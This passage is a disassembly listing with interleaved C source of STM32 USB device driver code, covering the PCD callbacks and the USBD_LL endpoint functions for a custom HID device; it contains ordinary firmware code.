 800c934:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c936:	687b      	ldr	r3, [r7, #4]
 800c938:	689b      	ldr	r3, [r3, #8]
 800c93a:	2b02      	cmp	r3, #2
 800c93c:	d001      	beq.n	800c942 <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c93e:	f7f4 f985 	bl	8000c4c <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c942:	687b      	ldr	r3, [r7, #4]
 800c944:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c948:	7bfa      	ldrb	r2, [r7, #15]
 800c94a:	4611      	mov	r1, r2
 800c94c:	4618      	mov	r0, r3
 800c94e:	f7fe fd21 	bl	800b394 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c952:	687b      	ldr	r3, [r7, #4]
 800c954:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c958:	4618      	mov	r0, r3
 800c95a:	f7fe fcc9 	bl	800b2f0 <USBD_LL_Reset>
}
 800c95e:	bf00      	nop
 800c960:	3710      	adds	r7, #16
 800c962:	46bd      	mov	sp, r7
 800c964:	bd80      	pop	{r7, pc}
	...

0800c968 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c968:	b580      	push	{r7, lr}
 800c96a:	b082      	sub	sp, #8
 800c96c:	af00      	add	r7, sp, #0
 800c96e:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c970:	687b      	ldr	r3, [r7, #4]
 800c972:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c976:	4618      	mov	r0, r3
 800c978:	f7fe fd1c 	bl	800b3b4 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800c97c:	687b      	ldr	r3, [r7, #4]
 800c97e:	699b      	ldr	r3, [r3, #24]
 800c980:	2b00      	cmp	r3, #0
 800c982:	d005      	beq.n	800c990 <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c984:	4b04      	ldr	r3, [pc, #16]	; (800c998 <HAL_PCD_SuspendCallback+0x30>)
 800c986:	691b      	ldr	r3, [r3, #16]
 800c988:	4a03      	ldr	r2, [pc, #12]	; (800c998 <HAL_PCD_SuspendCallback+0x30>)
 800c98a:	f043 0306 	orr.w	r3, r3, #6
 800c98e:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800c990:	bf00      	nop
 800c992:	3708      	adds	r7, #8
 800c994:	46bd      	mov	sp, r7
 800c996:	bd80      	pop	{r7, pc}
 800c998:	e000ed00 	.word	0xe000ed00

0800c99c <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c99c:	b580      	push	{r7, lr}
 800c99e:	b082      	sub	sp, #8
 800c9a0:	af00      	add	r7, sp, #0
 800c9a2:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800c9a4:	687b      	ldr	r3, [r7, #4]
 800c9a6:	699b      	ldr	r3, [r3, #24]
 800c9a8:	2b00      	cmp	r3, #0
 800c9aa:	d007      	beq.n	800c9bc <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c9ac:	4b08      	ldr	r3, [pc, #32]	; (800c9d0 <HAL_PCD_ResumeCallback+0x34>)
 800c9ae:	691b      	ldr	r3, [r3, #16]
 800c9b0:	4a07      	ldr	r2, [pc, #28]	; (800c9d0 <HAL_PCD_ResumeCallback+0x34>)
 800c9b2:	f023 0306 	bic.w	r3, r3, #6
 800c9b6:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800c9b8:	f000 faf0 	bl	800cf9c <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800c9bc:	687b      	ldr	r3, [r7, #4]
 800c9be:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9c2:	4618      	mov	r0, r3
 800c9c4:	f7fe fd12 	bl	800b3ec <USBD_LL_Resume>
}
 800c9c8:	bf00      	nop
 800c9ca:	3708      	adds	r7, #8
 800c9cc:	46bd      	mov	sp, r7
 800c9ce:	bd80      	pop	{r7, pc}
 800c9d0:	e000ed00 	.word	0xe000ed00

0800c9d4 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800c9d4:	b580      	push	{r7, lr}
 800c9d6:	b082      	sub	sp, #8
 800c9d8:	af00      	add	r7, sp, #0
 800c9da:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800c9dc:	f7f6 ff42 	bl	8003864 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800c9e0:	4a26      	ldr	r2, [pc, #152]	; (800ca7c <USBD_LL_Init+0xa8>)
 800c9e2:	687b      	ldr	r3, [r7, #4]
 800c9e4:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800c9e8:	687b      	ldr	r3, [r7, #4]
 800c9ea:	4a24      	ldr	r2, [pc, #144]	; (800ca7c <USBD_LL_Init+0xa8>)
 800c9ec:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800c9f0:	4b22      	ldr	r3, [pc, #136]	; (800ca7c <USBD_LL_Init+0xa8>)
 800c9f2:	4a23      	ldr	r2, [pc, #140]	; (800ca80 <USBD_LL_Init+0xac>)
 800c9f4:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800c9f6:	4b21      	ldr	r3, [pc, #132]	; (800ca7c <USBD_LL_Init+0xa8>)
 800c9f8:	2208      	movs	r2, #8
 800c9fa:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800c9fc:	4b1f      	ldr	r3, [pc, #124]	; (800ca7c <USBD_LL_Init+0xa8>)
 800c9fe:	2202      	movs	r2, #2
 800ca00:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ca02:	4b1e      	ldr	r3, [pc, #120]	; (800ca7c <USBD_LL_Init+0xa8>)
 800ca04:	2202      	movs	r2, #2
 800ca06:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ca08:	4b1c      	ldr	r3, [pc, #112]	; (800ca7c <USBD_LL_Init+0xa8>)
 800ca0a:	2200      	movs	r2, #0
 800ca0c:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ca0e:	4b1b      	ldr	r3, [pc, #108]	; (800ca7c <USBD_LL_Init+0xa8>)
 800ca10:	2200      	movs	r2, #0
 800ca12:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800ca14:	4b19      	ldr	r3, [pc, #100]	; (800ca7c <USBD_LL_Init+0xa8>)
 800ca16:	2200      	movs	r2, #0
 800ca18:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800ca1a:	4b18      	ldr	r3, [pc, #96]	; (800ca7c <USBD_LL_Init+0xa8>)
 800ca1c:	2200      	movs	r2, #0
 800ca1e:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800ca20:	4816      	ldr	r0, [pc, #88]	; (800ca7c <USBD_LL_Init+0xa8>)
 800ca22:	f7f5 f8e7 	bl	8001bf4 <HAL_PCD_Init>
 800ca26:	4603      	mov	r3, r0
 800ca28:	2b00      	cmp	r3, #0
 800ca2a:	d001      	beq.n	800ca30 <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800ca2c:	f7f4 f90e 	bl	8000c4c <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800ca30:	687b      	ldr	r3, [r7, #4]
 800ca32:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca36:	2318      	movs	r3, #24
 800ca38:	2200      	movs	r2, #0
 800ca3a:	2100      	movs	r1, #0
 800ca3c:	f7f6 fe31 	bl	80036a2 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800ca40:	687b      	ldr	r3, [r7, #4]
 800ca42:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca46:	2358      	movs	r3, #88	; 0x58
 800ca48:	2200      	movs	r2, #0
 800ca4a:	2180      	movs	r1, #128	; 0x80
 800ca4c:	f7f6 fe29 	bl	80036a2 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800ca50:	687b      	ldr	r3, [r7, #4]
 800ca52:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca56:	2398      	movs	r3, #152	; 0x98
 800ca58:	2200      	movs	r2, #0
 800ca5a:	2181      	movs	r1, #129	; 0x81
 800ca5c:	f7f6 fe21 	bl	80036a2 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800ca60:	687b      	ldr	r3, [r7, #4]
 800ca62:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca66:	23d8      	movs	r3, #216	; 0xd8
 800ca68:	2200      	movs	r2, #0
 800ca6a:	2101      	movs	r1, #1
 800ca6c:	f7f6 fe19 	bl	80036a2 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800ca70:	2300      	movs	r3, #0
}
 800ca72:	4618      	mov	r0, r3
 800ca74:	3708      	adds	r7, #8
 800ca76:	46bd      	mov	sp, r7
 800ca78:	bd80      	pop	{r7, pc}
 800ca7a:	bf00      	nop
 800ca7c:	20000b7c 	.word	0x20000b7c
 800ca80:	40006800 	.word	0x40006800

0800ca84 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800ca84:	b580      	push	{r7, lr}
 800ca86:	b084      	sub	sp, #16
 800ca88:	af00      	add	r7, sp, #0
 800ca8a:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ca8c:	2300      	movs	r3, #0
 800ca8e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ca90:	2300      	movs	r3, #0
 800ca92:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800ca94:	687b      	ldr	r3, [r7, #4]
 800ca96:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ca9a:	4618      	mov	r0, r3
 800ca9c:	f7f5 f9b0 	bl	8001e00 <HAL_PCD_Start>
 800caa0:	4603      	mov	r3, r0
 800caa2:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800caa4:	7bbb      	ldrb	r3, [r7, #14]
 800caa6:	2b03      	cmp	r3, #3
 800caa8:	d816      	bhi.n	800cad8 <USBD_LL_Start+0x54>
 800caaa:	a201      	add	r2, pc, #4	; (adr r2, 800cab0 <USBD_LL_Start+0x2c>)
 800caac:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cab0:	0800cac1 	.word	0x0800cac1
 800cab4:	0800cac7 	.word	0x0800cac7
 800cab8:	0800cacd 	.word	0x0800cacd
 800cabc:	0800cad3 	.word	0x0800cad3
    case HAL_OK :
      usb_status = USBD_OK;
 800cac0:	2300      	movs	r3, #0
 800cac2:	73fb      	strb	r3, [r7, #15]
    break;
 800cac4:	e00b      	b.n	800cade <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cac6:	2303      	movs	r3, #3
 800cac8:	73fb      	strb	r3, [r7, #15]
    break;
 800caca:	e008      	b.n	800cade <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cacc:	2301      	movs	r3, #1
 800cace:	73fb      	strb	r3, [r7, #15]
    break;
 800cad0:	e005      	b.n	800cade <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cad2:	2303      	movs	r3, #3
 800cad4:	73fb      	strb	r3, [r7, #15]
    break;
 800cad6:	e002      	b.n	800cade <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cad8:	2303      	movs	r3, #3
 800cada:	73fb      	strb	r3, [r7, #15]
    break;
 800cadc:	bf00      	nop
  }
  return usb_status;
 800cade:	7bfb      	ldrb	r3, [r7, #15]
}
 800cae0:	4618      	mov	r0, r3
 800cae2:	3710      	adds	r7, #16
 800cae4:	46bd      	mov	sp, r7
 800cae6:	bd80      	pop	{r7, pc}

0800cae8 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cae8:	b580      	push	{r7, lr}
 800caea:	b084      	sub	sp, #16
 800caec:	af00      	add	r7, sp, #0
 800caee:	6078      	str	r0, [r7, #4]
 800caf0:	4608      	mov	r0, r1
 800caf2:	4611      	mov	r1, r2
 800caf4:	461a      	mov	r2, r3
 800caf6:	4603      	mov	r3, r0
 800caf8:	70fb      	strb	r3, [r7, #3]
 800cafa:	460b      	mov	r3, r1
 800cafc:	70bb      	strb	r3, [r7, #2]
 800cafe:	4613      	mov	r3, r2
 800cb00:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb02:	2300      	movs	r3, #0
 800cb04:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb06:	2300      	movs	r3, #0
 800cb08:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cb0a:	687b      	ldr	r3, [r7, #4]
 800cb0c:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cb10:	78bb      	ldrb	r3, [r7, #2]
 800cb12:	883a      	ldrh	r2, [r7, #0]
 800cb14:	78f9      	ldrb	r1, [r7, #3]
 800cb16:	f7f5 fae1 	bl	80020dc <HAL_PCD_EP_Open>
 800cb1a:	4603      	mov	r3, r0
 800cb1c:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb1e:	7bbb      	ldrb	r3, [r7, #14]
 800cb20:	2b03      	cmp	r3, #3
 800cb22:	d817      	bhi.n	800cb54 <USBD_LL_OpenEP+0x6c>
 800cb24:	a201      	add	r2, pc, #4	; (adr r2, 800cb2c <USBD_LL_OpenEP+0x44>)
 800cb26:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb2a:	bf00      	nop
 800cb2c:	0800cb3d 	.word	0x0800cb3d
 800cb30:	0800cb43 	.word	0x0800cb43
 800cb34:	0800cb49 	.word	0x0800cb49
 800cb38:	0800cb4f 	.word	0x0800cb4f
    case HAL_OK :
      usb_status = USBD_OK;
 800cb3c:	2300      	movs	r3, #0
 800cb3e:	73fb      	strb	r3, [r7, #15]
    break;
 800cb40:	e00b      	b.n	800cb5a <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb42:	2303      	movs	r3, #3
 800cb44:	73fb      	strb	r3, [r7, #15]
    break;
 800cb46:	e008      	b.n	800cb5a <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb48:	2301      	movs	r3, #1
 800cb4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cb4c:	e005      	b.n	800cb5a <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb4e:	2303      	movs	r3, #3
 800cb50:	73fb      	strb	r3, [r7, #15]
    break;
 800cb52:	e002      	b.n	800cb5a <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cb54:	2303      	movs	r3, #3
 800cb56:	73fb      	strb	r3, [r7, #15]
    break;
 800cb58:	bf00      	nop
  }
  return usb_status;
 800cb5a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb5c:	4618      	mov	r0, r3
 800cb5e:	3710      	adds	r7, #16
 800cb60:	46bd      	mov	sp, r7
 800cb62:	bd80      	pop	{r7, pc}

0800cb64 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cb64:	b580      	push	{r7, lr}
 800cb66:	b084      	sub	sp, #16
 800cb68:	af00      	add	r7, sp, #0
 800cb6a:	6078      	str	r0, [r7, #4]
 800cb6c:	460b      	mov	r3, r1
 800cb6e:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb70:	2300      	movs	r3, #0
 800cb72:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb74:	2300      	movs	r3, #0
 800cb76:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cb78:	687b      	ldr	r3, [r7, #4]
 800cb7a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cb7e:	78fa      	ldrb	r2, [r7, #3]
 800cb80:	4611      	mov	r1, r2
 800cb82:	4618      	mov	r0, r3
 800cb84:	f7f5 fb07 	bl	8002196 <HAL_PCD_EP_Close>
 800cb88:	4603      	mov	r3, r0
 800cb8a:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb8c:	7bbb      	ldrb	r3, [r7, #14]
 800cb8e:	2b03      	cmp	r3, #3
 800cb90:	d816      	bhi.n	800cbc0 <USBD_LL_CloseEP+0x5c>
 800cb92:	a201      	add	r2, pc, #4	; (adr r2, 800cb98 <USBD_LL_CloseEP+0x34>)
 800cb94:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb98:	0800cba9 	.word	0x0800cba9
 800cb9c:	0800cbaf 	.word	0x0800cbaf
 800cba0:	0800cbb5 	.word	0x0800cbb5
 800cba4:	0800cbbb 	.word	0x0800cbbb
    case HAL_OK :
      usb_status = USBD_OK;
 800cba8:	2300      	movs	r3, #0
 800cbaa:	73fb      	strb	r3, [r7, #15]
    break;
 800cbac:	e00b      	b.n	800cbc6 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cbae:	2303      	movs	r3, #3
 800cbb0:	73fb      	strb	r3, [r7, #15]
    break;
 800cbb2:	e008      	b.n	800cbc6 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cbb4:	2301      	movs	r3, #1
 800cbb6:	73fb      	strb	r3, [r7, #15]
    break;
 800cbb8:	e005      	b.n	800cbc6 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cbba:	2303      	movs	r3, #3
 800cbbc:	73fb      	strb	r3, [r7, #15]
    break;
 800cbbe:	e002      	b.n	800cbc6 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cbc0:	2303      	movs	r3, #3
 800cbc2:	73fb      	strb	r3, [r7, #15]
    break;
 800cbc4:	bf00      	nop
  }
  return usb_status;
 800cbc6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbc8:	4618      	mov	r0, r3
 800cbca:	3710      	adds	r7, #16
 800cbcc:	46bd      	mov	sp, r7
 800cbce:	bd80      	pop	{r7, pc}

0800cbd0 <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbd0:	b580      	push	{r7, lr}
 800cbd2:	b084      	sub	sp, #16
 800cbd4:	af00      	add	r7, sp, #0
 800cbd6:	6078      	str	r0, [r7, #4]
 800cbd8:	460b      	mov	r3, r1
 800cbda:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cbdc:	2300      	movs	r3, #0
 800cbde:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cbe0:	2300      	movs	r3, #0
 800cbe2:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cbe4:	687b      	ldr	r3, [r7, #4]
 800cbe6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cbea:	78fa      	ldrb	r2, [r7, #3]
 800cbec:	4611      	mov	r1, r2
 800cbee:	4618      	mov	r0, r3
 800cbf0:	f7f5 fc66 	bl	80024c0 <HAL_PCD_EP_Flush>
 800cbf4:	4603      	mov	r3, r0
 800cbf6:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cbf8:	7bbb      	ldrb	r3, [r7, #14]
 800cbfa:	2b03      	cmp	r3, #3
 800cbfc:	d816      	bhi.n	800cc2c <USBD_LL_FlushEP+0x5c>
 800cbfe:	a201      	add	r2, pc, #4	; (adr r2, 800cc04 <USBD_LL_FlushEP+0x34>)
 800cc00:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc04:	0800cc15 	.word	0x0800cc15
 800cc08:	0800cc1b 	.word	0x0800cc1b
 800cc0c:	0800cc21 	.word	0x0800cc21
 800cc10:	0800cc27 	.word	0x0800cc27
    case HAL_OK :
      usb_status = USBD_OK;
 800cc14:	2300      	movs	r3, #0
 800cc16:	73fb      	strb	r3, [r7, #15]
    break;
 800cc18:	e00b      	b.n	800cc32 <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc1a:	2303      	movs	r3, #3
 800cc1c:	73fb      	strb	r3, [r7, #15]
    break;
 800cc1e:	e008      	b.n	800cc32 <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc20:	2301      	movs	r3, #1
 800cc22:	73fb      	strb	r3, [r7, #15]
    break;
 800cc24:	e005      	b.n	800cc32 <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc26:	2303      	movs	r3, #3
 800cc28:	73fb      	strb	r3, [r7, #15]
    break;
 800cc2a:	e002      	b.n	800cc32 <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc2c:	2303      	movs	r3, #3
 800cc2e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc30:	bf00      	nop
  }
  return usb_status;
 800cc32:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc34:	4618      	mov	r0, r3
 800cc36:	3710      	adds	r7, #16
 800cc38:	46bd      	mov	sp, r7
 800cc3a:	bd80      	pop	{r7, pc}

0800cc3c <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc3c:	b580      	push	{r7, lr}
 800cc3e:	b084      	sub	sp, #16
 800cc40:	af00      	add	r7, sp, #0
 800cc42:	6078      	str	r0, [r7, #4]
 800cc44:	460b      	mov	r3, r1
 800cc46:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc48:	2300      	movs	r3, #0
 800cc4a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc4c:	2300      	movs	r3, #0
 800cc4e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cc50:	687b      	ldr	r3, [r7, #4]
 800cc52:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc56:	78fa      	ldrb	r2, [r7, #3]
 800cc58:	4611      	mov	r1, r2
 800cc5a:	4618      	mov	r0, r3
 800cc5c:	f7f5 fb7c 	bl	8002358 <HAL_PCD_EP_SetStall>
 800cc60:	4603      	mov	r3, r0
 800cc62:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc64:	7bbb      	ldrb	r3, [r7, #14]
 800cc66:	2b03      	cmp	r3, #3
 800cc68:	d816      	bhi.n	800cc98 <USBD_LL_StallEP+0x5c>
 800cc6a:	a201      	add	r2, pc, #4	; (adr r2, 800cc70 <USBD_LL_StallEP+0x34>)
 800cc6c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc70:	0800cc81 	.word	0x0800cc81
 800cc74:	0800cc87 	.word	0x0800cc87
 800cc78:	0800cc8d 	.word	0x0800cc8d
 800cc7c:	0800cc93 	.word	0x0800cc93
    case HAL_OK :
      usb_status = USBD_OK;
 800cc80:	2300      	movs	r3, #0
 800cc82:	73fb      	strb	r3, [r7, #15]
    break;
 800cc84:	e00b      	b.n	800cc9e <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc86:	2303      	movs	r3, #3
 800cc88:	73fb      	strb	r3, [r7, #15]
    break;
 800cc8a:	e008      	b.n	800cc9e <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc8c:	2301      	movs	r3, #1
 800cc8e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc90:	e005      	b.n	800cc9e <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc92:	2303      	movs	r3, #3
 800cc94:	73fb      	strb	r3, [r7, #15]
    break;
 800cc96:	e002      	b.n	800cc9e <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc98:	2303      	movs	r3, #3
 800cc9a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc9c:	bf00      	nop
  }
  return usb_status;
 800cc9e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cca0:	4618      	mov	r0, r3
 800cca2:	3710      	adds	r7, #16
 800cca4:	46bd      	mov	sp, r7
 800cca6:	bd80      	pop	{r7, pc}

0800cca8 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cca8:	b580      	push	{r7, lr}
 800ccaa:	b084      	sub	sp, #16
 800ccac:	af00      	add	r7, sp, #0
 800ccae:	6078      	str	r0, [r7, #4]
 800ccb0:	460b      	mov	r3, r1
 800ccb2:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccb4:	2300      	movs	r3, #0
 800ccb6:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ccb8:	2300      	movs	r3, #0
 800ccba:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800ccbc:	687b      	ldr	r3, [r7, #4]
